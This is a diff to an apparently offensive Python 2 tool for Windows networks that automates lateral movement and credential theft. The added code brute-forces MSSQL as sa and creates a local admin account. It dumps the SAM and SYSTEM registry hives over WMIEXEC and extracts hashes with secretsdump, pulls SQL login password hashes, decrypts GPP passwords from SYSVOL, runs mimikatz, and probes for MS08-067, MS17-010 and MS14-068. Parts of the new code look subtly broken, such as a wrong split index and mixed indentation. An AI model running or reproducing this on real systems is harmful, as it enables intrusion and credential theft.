@@ -101,6 +101,7 @@ pathNTDSExtract='/pentest/ntdsxtract/'
 optionMS14068=True
 optionTokenPriv=True
 
+domainAuthenticationOK=False
 amsiMode=False
 demo=False
 debugMode=False
@@ -1132,15 +1133,36 @@ def bruteMSSQLAuto(hostNo,portNo):
                     print (setColor("[+]", bold, color="green"))+" "+hostNo+":445 | sa:"+password+" | "+(setColor("[Adding Local Admin Account]", bold, color="green"))+" | "+tmpCreateUsername+":"+tmpCreatePassword
                     if testAccountSilent(hostNo, 'WORKGROUP', tmpCreateUsername, tmpCreatePassword, None)==True:
                         print (setColor("[+]", bold, color="green"))+" "+hostNo+":445 | "+tmpCreateUsername+":"+tmpCreatePassword+" | "+(setColor("[Testing Access]", bold, color="green"))+(setColor(" [OK]", bold, color="blue"))
-                        tmppasswordHash=None
-                        tmpPasswordList=runMimikatz(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,tmppasswordHash)
-                        for y in tmpPasswordList:
-                            if y not in userPassList:
-                                userPassList.append(y)            
-                        #if len(tmpPasswordList)>0:
-                        #    print "\n"
-                        print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip
-                        tmpHashList=dumpDCHashes(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,tmppasswordHash)
+
+                        if getPowershellPath(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,None)==None:
+                            print (setColor("[+]", bold, color="green"))+" "+hostNo+":445 | "+tmpCreateUsername+":"+tmpCreatePassword+" | "+(setColor("[Powershell]", bold, color="green"))+" | Not Available"
+                            cmd = "reg save HKLM\SAM C:\\windows\\temp\\SAM /y"
+                            results,status=runWMIEXEC(hostNo, 'WORKGROUP', tmpCreateUsername, tmpCreatePassword, None, cmd)        
+                            cmd = "reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM /y"
+                            results,status=runWMIEXEC(hostNo, 'WORKGROUP', tmpCreateUsername, tmpCreatePassword, None, cmd)        
+                            cmd = "dir C:\\windows\\temp"
+                            results,status=runWMIEXEC(hostNo, 'WORKGROUP', tmpCreateUsername, tmpCreatePassword, None, cmd)        
+                            file1Location= downloadFile(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,'C:\\windows\\temp\\SYSTEM')
+                            file2Location= downloadFile(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,'C:\\windows\\temp\\SAM')
+                            print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+hostNo
+                            cmd = "python "+modulesDir+"/impacket/examples/secretsdump.py -system "+file1Location+" -sam "+file2Location+" LOCAL"
+                            resultList = runCommand(cmd, shell = True, timeout = 30)
+                            tmpResultList=resultList[1].split("\n")
+                            for y in tmpResultList:
+                                y=y.strip()
+                                if len(y)>0:
+                                    if "Core Security Technologies" not in y and "Cleaning up" not in y and "[*]" not in y:
+                                        print y
+                        else:
+                            tmppasswordHash=None
+                            tmpPasswordList=runMimikatz(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,tmppasswordHash)
+                            for y in tmpPasswordList:
+                                if y not in userPassList:
+                                    userPassList.append(y)            
+                            #if len(tmpPasswordList)>0:
+                            #    print "\n"
+                            print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip
+                            tmpHashList=dumpDCHashes(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,tmppasswordHash)
                     else:
                         print (setColor("[+]", bold, color="green"))+" "+hostNo+":445 | "+tmpCreateUsername+":"+tmpCreatePassword+" | "+(setColor("[Testing Access]", bold, color="green"))+" No Access"
                         print (setColor("[+]", bold, color="green"))+" "+hostNo+":445 | sa:"+password+" | "+(setColor("[Enable ADMIN Shares]", bold, color="green"))+" | Require Rebooting"
@@ -1426,17 +1448,30 @@ def dumpMSSQLHash(hostNo,port,username,password,domain):
         #for x in tmpResultList:
         #   print x.split("\t")
     else:
-        query="SELECT ''+ name + '\t' + password + ' ' FROM master.dbo.sysxlogins;"
-        if len(domain)>0:
-            tmpResultList=runSQLQuery(hostNo,domain+"\\"+username,password,query)
+        tmpResultList1=[]
+        if "2005" in str(tmpResultList):
+            query="SELECT name, master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins;"
+            if len(domain)>0:
+                tmpResultList=runSQLQuery(hostNo,domain+"\\"+username,password,query)
+            else:
+                tmpResultList=runSQLQuery(hostNo,username,password,query)
+            for x in tmpResultList:
+                tmpUsername=x[0]
+                tmpPasswordHash=x[1]
+                if tmpUsername!='##MS_PolicyEventProcessingLogin##' and tmpUsername!='##MS_PolicyTsqlExecutionLogin##':
+                    tmpResultList1.append([tmpUsername,tmpPasswordHash])                
         else:
-            tmpResultList=runSQLQuery(hostNo,username,password,query)
-    tmpResultList1=[]
-    for x in tmpResultList:
-        tmpUsername=x[0].split("\t")[0]
-        tmpPasswordHash=x[0].split("\t")[1]
-        if tmpUsername!='##MS_PolicyEventProcessingLogin##' and tmpUsername!='##MS_PolicyTsqlExecutionLogin##':
-            tmpResultList1.append([tmpUsername,tmpPasswordHash])
+            query="SELECT ''+ name + '\t' + password + ' ' FROM master.dbo.sysxlogins;"
+            if len(domain)>0:
+                tmpResultList=runSQLQuery(hostNo,domain+"\\"+username,password,query)
+            else:
+                tmpResultList=runSQLQuery(hostNo,username,password,query)
+            for x in tmpResultList:
+                tmpUsername=x[0].split("\t")[0]
+                tmpPasswordHash=x[0].split("\t")[1]
+                if tmpUsername!='##MS_PolicyEventProcessingLogin##' and tmpUsername!='##MS_PolicyTsqlExecutionLogin##':
+                    tmpResultList1.append([tmpUsername,tmpPasswordHash])
+    #tmpResultList1=[]
     if len(domain)>0:
         tmpFooter=(setColor("[+]", bold, color="green"))+" "+hostNo+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[MSSQL]", bold, color="green"))+" | Dump Credentials"
     else:
@@ -1460,7 +1495,10 @@ def dumpMSSQLIDF(hostNo,port,username,password,domain):
         #for x in tmpResultList:
         #   print x.split("\t")
     else:
-        query="SELECT ''+ name + '\t' + password + ' ' FROM master.dbo.sysxlogins;"
+        if "2005" in str(tmpResultList):
+            query="SELECT name, master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins;"
+        else:
+            query="SELECT ''+ name + '\t' + password + ' ' FROM master.dbo.sysxlogins;"
         if len(domain)>0:
             tmpResultList=runSQLQuery(hostNo,domain+"\\"+username,password,query)
         else:
@@ -1660,36 +1698,31 @@ def testDomainCredentials(username,password,passwordHash,ip,domain,silent):
             executer = WMIEXEC(command,username,password,domain,passwordHash,aesKey,share,nooutput,k,dc_ip)
             loginStatus=executer.run(ip)
             resultsOutput=executer.getOutput()
+            if debugMode==True:
+                print loginStatus
             if "STATUS_LOGON_FAILURE" in str(loginStatus):
                 if password!=None:
                     #if silent==False:
                     #    print (setColor("[-]", bold, color="red"))+" "+ip+":445 | "+domain+"\\"+username+":"+password+" [Failed]"
                     return False,foundAdmin 
                 else:
-                    #if silent==False:
-                    #    print (setColor("[-]", bold, color="red"))+" "+ip+":445 | "+domain+"\\"+username+":"+passwordHash+" [Failed]"
                     return False,foundAdmin 
             else:
                 if 'rpc_s_access_denied' in str(loginStatus) or 'WBEM_E_ACCESS_DENIED' in str(loginStatus) or 'access_denied' in str(loginStatus).lower():
                     if password!=None:
-                        #if silent==False:
-                        #    print (setColor("[+]", bold, color="green"))+" "+ip+":445 | "+domain+"\\"+username+":"+password+" [OK]"
                         return True,foundAdmin 
                     else:
-                        #if silent==False:
-                        #    print (setColor("[+]", bold, color="green"))+" "+ip+":445 | "+domain+"\\"+username+":"+passwordHash+" [OK]"
                         return True,foundAdmin 
                 else:
-                    if password!=None:
-                        #if silent==False:
-                        #    print (setColor("[+]", bold, color="green"))+" "+ip+":445 | "+domain+"\\"+username+":"+password+" [OK][Admin]"
-                        foundAdmin=True
-                        return True,foundAdmin 
+                    if "Errno" in str(loginStatus):
+                        return False,foundAdmin
                     else:
-                        #if silent==False:
-                        #    print (setColor("[+]", bold, color="green"))+" "+ip+":445 | "+domain+"\\"+username+":"+passwordHash+" [OK][Admin]"
-                        foundAdmin=True
-                        return True,foundAdmin 
+                        if password!=None:
+                            foundAdmin=True
+                            return True,foundAdmin 
+                        else:
+                            foundAdmin=True
+                            return True,foundAdmin 
         except:
             return False,foundAdmin
 
@@ -1904,7 +1937,7 @@ def parseMimikatzOutput(list1):
     return tmpPasswordList
 
 def analyzeHashes(hashList):
-    print (setColor("[+]", bold, color="green"))+" Analyzing Hashes for Patterns"
+    #print (setColor("[+]", bold, color="green"))+" Analyzing Hashes for Patterns"
     #Blank 31d6cfe0d16ae931b73c59d7e0c089c0
     #NoLM  aad3b435b51404eeaad3b435b51404ee
     tmpBlankHashList=[]
@@ -1926,7 +1959,7 @@ def analyzeHashes(hashList):
     for key, value in tmpHashList.iteritems():
         tmpResultList.append([key,value])
     if len(tmpResultList):
-        print "Password Hashes Used By the Below Accounts"
+        print (setColor("[+]", bold, color="green"))+" Password Hashes Used By the Below Accounts"
         print tabulate(tmpResultList)
     if len(tmpBlankHashList):
         print "\nAccounts Using BLANK Password"
@@ -2077,36 +2110,27 @@ def testAccount(targetIP, domain, username, password, passwordHash):
     status=''
     while complete==False:
         results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, cmd) 
-        #print targetIP+"\t"+status
-        if "can't start new thread" not in str(status):
-            complete=True
         if debugMode==True:
             print status
-        if 'STATUS_LOGON_FAILURE' in str(status):
-            if len(domain)>0:
-                print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [Failed]"            
-            else:
-                print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+username+":"+password+" [Failed]"            
-            return False
-        elif 'rpc_s_access_denied' in str(status) or 'WBEM_E_ACCESS_DENIED' in str(status) or 'access_denied' in str(status).lower():
-            if len(domain)>0:
-                print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [OK]"            
-            else:
-                print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+username+":"+password+" [OK]"            
-            return False        
-        else:
-            if targetIP in str(results):
-                if len(domain)>0:
-                    print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" "+(setColor("[OK][ADMIN]", bold, color="green"))
-                else:
-                    print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+username+":"+password+" "+(setColor("[OK][ADMIN]", bold, color="green"))
+        if targetIP in str(results):
+                print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" "+(setColor("[OK][ADMIN]", bold, color="green"))
+                domainAuthenticationOK=True
                 return True
-            else:
-                if len(domain)>0:
-                    print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [Failed]"            
-                else:
-                    print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+username+":"+password+" [Failed]"            
-                return False
+    	else:  
+            	if 'STATUS_LOGON_FAILURE' in str(status):
+                 	print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [Failed]"            
+                	return False
+                elif 'rpc_s_access_denied' in str(status) or 'WBEM_E_ACCESS_DENIED' in str(status) or 'access_denied' in str(status).lower():
+                        print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [OK]"            
+                        domainAuthenticationOK=True
+                        return False        
+            	else:
+                        if "can't start new thread" in str(status):
+			    return False
+                            #complete=True
+                        else:                      
+                            print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [Failed]"            
+                            return False
 
 def testAccountSilent(targetIP, domain, username, password, passwordHash):
     if username!="guest":
@@ -3534,7 +3558,7 @@ def getOSType():
     import platform
     return platform.system()
 
-def mountSysvol(username,password):
+def mountSysvol(domain,username,password):
     #Sample cpassword=j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
     tmpPassList=[]
     status,foundAdmin=testDomainCredentials(username,password,None,dcList[0],'WORKGROUP',True)
@@ -3557,12 +3581,12 @@ def mountSysvol(username,password):
         if debugMode==True:
             print cmd
         if len(resultList[1])<1:
-            print "\n"+(setColor("[*]", bold, color="blue"))+" "+dcList[0]+":445 | "+username+":"+password+" | "+(setColor("[Check sysvol] ", bold, color="green"))+"No credentials found"    
+            print "\n"+(setColor("[*]", bold, color="blue"))+" "+dcList[0]+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[Check sysvol] ", bold, color="green"))+"No credentials found"    
         if len(resultList[1])>0:
             fileList=resultList[1].split("\n")
             tmpPassList=[]
             if len(fileList)>0:
-                print (setColor("[*]", bold, color="blue"))+" "+dcList[0]+":445 | "+username+":"+password+" | "+(setColor("[Sysvol] ", bold, color="green"))+"Found GPP Passwords"
+                print (setColor("[*]", bold, color="blue"))+" "+dcList[0]+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[Sysvol] ", bold, color="green"))+"Found GPP Passwords"
                 #print (setColor("[+]", bold, color="green"))+" Credentials found in SYSVOL folder"
                 for x in fileList:
                     x=x.strip()
@@ -3586,7 +3610,7 @@ def mountSysvol(username,password):
                                         tmpPassList.append([tmpusername,tmppassword])
             if len(tmpPassList)>0:
                 for x in tmpPassList:
-                    print (setColor("[*]", bold, color="blue"))+" "+dcList[0]+":445 | "+username+":"+password+" | "+(setColor("[sysvol] ", bold, color="green"))+" Decrypted GPP Password: "+x[0]+":"+x[1] 
+                    print (setColor("[*]", bold, color="blue"))+" "+dcList[0]+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[sysvol] ", bold, color="green"))+" Decrypted GPP Password: "+x[0]+":"+x[1] 
                     #print (setColor("[+]", bold, color="green"))+" Decrypted GPP Password"            
                     #headers = ["Username","Password"]
                     #print tabulate(tmpPassList,headers,tablefmt="simple")
@@ -4429,7 +4453,7 @@ def testMS14_068(ip,domain,username,password,passwordHash):
 
 
             except Exception:
-            	    print (setColor("[-]", bold, color="red"))+" "+ip+":445 | "+username+":"+password+" | "+(setColor("[Testing MS14-068] ", bold, color="green"))+" | Not Vulnerable"    
+            	    print (setColor("[-]", bold, color="red"))+" "+ip+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[Testing MS14-068] ", bold, color="green"))+" | Not Vulnerable"    
                     #print (setColor("[-]", bold, color="red"))+" DC "+ip+" not vulnerable to MS14-048"
                     pass
 
@@ -4530,6 +4554,7 @@ parser.add_argument("target", nargs='*', type=str, help="The target IP(s), range
 parser.add_argument("-d", type=str, dest="domain", help="Domain Name")
 parser.add_argument("-u", type=str, dest="username", help="Username")
 parser.add_argument("-p", type=str, dest="password", help="Password")
+#parser.add_argument("-C", type=str, dest="combinedList", help="File containing usernames/passwords (e.g. domain\\username||password)")
 parser.add_argument("-s", '--skip', action='store_true', help="Skip Lateral Movement/Privilege Escalation.  Only run POST exploitation modules")
 parser.add_argument('-L', '--list-modules', action='store_true', help='List available modules')
 parser.add_argument('-amsi', action='store_true', help='Enable AMSI Bypass')
@@ -4592,8 +4617,25 @@ if args.password:
     password=args.password
 #if not args.domain or not args.username or not args.password:
 if not args.username or not args.password:
+    #if not args.combinedList:
     print (setColor("[!]", bold, color="red"))+" Please provide the domain, username and password"
     sys.exit()
+
+combinedUserPassList=[]
+'''
+if args.combinedList:
+    with open(args.combinedList) as f:
+        lines = f.read().splitlines()
+        for x in lines:
+            tmpusername=x.split("||")[0]
+            tmppassword=x.split("||")[1]
+            if [tmpusername,tmppassword] not in combinedUserPassList:
+                combinedUserPassList.append([tmpusername,tmppassword])
+else:
+'''
+if args.username or args.password:
+    if [args.username,args.password] not in combinedUserPassList:
+        combinedUserPassList.append([args.username,args.password])
 
 if os.path.exists("secrets.ntds"):
     os.remove("secrets.ntds")
@@ -4651,8 +4693,8 @@ ipListStr=", ".join(ipList)
 print (setColor("[*]", bold, color="green"))+" Scanning Target Network"
 myIP=get_ip_address()
 
-web_dir = os.getcwd()+"/modules"
-os.chdir(web_dir)
+modulesDir = os.getcwd()+"/modules"
+os.chdir(modulesDir)
 threading.Thread(target=my_tcp_server).start()
 
 #updateMimiStaging()
@@ -4745,21 +4787,29 @@ passwordHash=None
 
 cleanUp()
 for x in nbList:
-    #testAccount
-    #tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,x,domain)
-    #if tmpAdminOK==True:
-    if testAccount(x, domain, username, password, passwordHash)==True:
-        if [x, domain, username, password] not in accessAdmHostList:
-            accessAdmHostList.append([x, domain, username, password])                            
+    for y in combinedUserPassList:
+        domain="WORKGROUP"
+        passwordHash=None
+        username=y[0]        
+        if "\\" in username:
+            domain=username.split("\\")[0]
+            username=username.split("\\")[2]
+        password=y[1]
+        if testAccount(x, domain, username, password, passwordHash)==True:
+            if [x, domain, username, password] not in accessAdmHostList:
+                accessAdmHostList.append([x, domain, username, password])                            
 for x in dcList:
-    if testAccount(x, domain, username, password, passwordHash)==True:
-        if [x, domain, username, password] not in accessAdmHostList:
-            accessAdmHostList.append([x, domain, username, password])                                    
-    #tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,x,domain)
-    #if tmpAdminOK==True:
-    #    if [x, domain, username, password] not in accessAdmHostList:
-    #        accessAdmHostList.append([x, domain, username, password])                            
-#print "\n"
+    for y in combinedUserPassList:
+        domain="WORKGROUP"
+        passwordHash=None
+        username=y[0]        
+        if "\\" in username:
+            domain=username.split("\\")[0]
+            username=username.split("\\")[2]
+        password=y[1]
+        if testAccount(x, domain, username, password, passwordHash)==True:
+            if [x, domain, username, password] not in accessAdmHostList:
+                accessAdmHostList.append([x, domain, username, password])                            
 
 if skipMode==False:
     if len(dcList)>0:    
@@ -4768,7 +4818,7 @@ if skipMode==False:
         if len(dcList)>0:
             ip=dcList[0]
             #print (setColor("\nChecking SYSVOL for Credentials", color="green"))
-            mountSysvol(username,password)
+            mountSysvol(domain,username,password)
 
         tmpHostList=[]
         for y in accessAdmHostList:
@@ -4831,7 +4881,7 @@ if skipMode==False:
 
     else:
         if len(dcList)>0:
-            mountSysvol(username,password)
+            mountSysvol(domain,username,password)
             for ip in dcList:
                 tmpHostList=[]
                 for y in accessAdmHostList:
@@ -4950,7 +5000,7 @@ if skipMode==False:
             #    domain="WORKGROUP"  
             #print (setColor("\nChecking SYSVOL for Credentials", color="green"))
             #mountSysvol(username,password)
-            if optionMS14068==True:
+            if optionMS14068==True and domainAuthenticationOK==True:
                 tmpPassList,tmpHashList=testMS14_068(ip,domain,username,password,passwordHash)
                 if len(tmpPassList)>0 or len(tmpHashList)>0:
                     for x in tmpHashList:
@@ -5663,6 +5713,26 @@ if args.module=="vuln":
     from modules import ms08_067
     from modules import ms17_010
     ms08_067List=[]
+    for ip in dcList:
+        tmpResultList=ms08_067.check(ip)
+        if len(tmpResultList)>0:
+            for x in tmpResultList:
+                tmpIP=x[0]
+                tmpStatus=x[1]
+                if tmpStatus=='VULNERABLE':
+                    if tmpIP not in ms08_067List:
+                        ms08_067List.append(tmpIP)
+                    #print (setColor("[+]", bold, color="green"))+" "+tmpIP+":445 | "+(setColor("[MS08-067]", color="green"))
+        result=ms17_010.check(ip)
+        if 'is likely VULNERABLE ' in str(result):
+            result=result.replace('[+] [','')
+            result=result.replace('(','')
+            result=result.replace(')','')
+            if ip not in ms08_067List:
+                result=result.replace('] is likely VULNERABLE to MS17-010!',':445 | '+(setColor("[MS17-010]", color="green")))
+            else:
+                result=result.replace('] is likely VULNERABLE to MS17-010!',':445 | '+(setColor("[MS08-067][MS17-010]", color="green")))                
+            print (setColor("[+] ", bold, color="green"))+result
     for ip in nbList:
         tmpResultList=ms08_067.check(ip)
         if len(tmpResultList)>0:
@@ -5674,7 +5744,7 @@ if args.module=="vuln":
                         ms08_067List.append(tmpIP)
                     #print (setColor("[+]", bold, color="green"))+" "+tmpIP+":445 | "+(setColor("[MS08-067]", color="green"))
         result=ms17_010.check(ip)
-        if 'is likely VULNERABLE ' in result:
+        if 'is likely VULNERABLE ' in str(result):
             result=result.replace('[+] [','')
             result=result.replace('(','')
             result=result.replace(')','')
